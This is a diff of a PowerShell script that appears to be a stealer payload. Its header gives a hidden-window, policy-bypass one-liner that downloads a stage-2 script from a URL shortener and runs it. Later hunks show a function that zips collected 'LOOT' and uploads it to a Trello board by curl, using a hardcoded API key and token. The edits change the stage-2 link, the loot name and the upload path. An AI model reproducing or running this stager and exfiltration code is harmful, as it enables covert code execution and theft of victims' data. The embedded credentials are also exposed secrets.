@@ -1,8 +1,8 @@
 <# 
 
 Execute command having a max caracters to put into, I need to shorten the links for the command to be as short as possible.
-THIS Stage2 url : 
-                    https://shorturl.at/lABHY
+Stage2 url : 
+                    https://shorturl.at/fiZ38
 
 
 Need to modify the invoke command to fit your needs : 
@@ -10,7 +10,7 @@ Need to modify the invoke command to fit your needs :
  	-Put your dropbox webhook into $db=''
 
 Invoke powershell + stage 2 into it + be furtive : 
-powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/lABHY | iex
+powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/fiZ38 | iex
 
 
 #>
@@ -98,7 +98,7 @@ ZipFiles
 function Upload-Trello{
     
 # Replace the following values with your own
-$name = "${username} LOOT ${dateSansHeure}"
+$name = "${username}_LOOT_${dateSansHeure}"
 $idList = "65c269cf32172bbc68af098b"
 $key = "e790f6a8afdd977c1ee4ccc549594c51"
 $token = "ATTA5d320a9d9329170b731f2c4a458ff9feb7777bd447bfaf0479a4646e26c8239b83D4CC8D"
@@ -132,7 +132,7 @@ Set-ItemProperty -Path "C:\temp\L00T.zip" -Name "Attributes" -Value "Archive"
 
 
 # Envoi de la requête POST avec curl pour télécharger le fichier
-& "curl.exe" -sS --request POST --url "$attachmentUrl" --form "key=$key" --form "token=$token" --form "file=@C:\temp\L00T.zip"
+& "curl.exe" -sS --request POST --url "$attachmentUrl" --form "key=$key" --form "token=$token" --form "file=@$filePath"
 
 
 
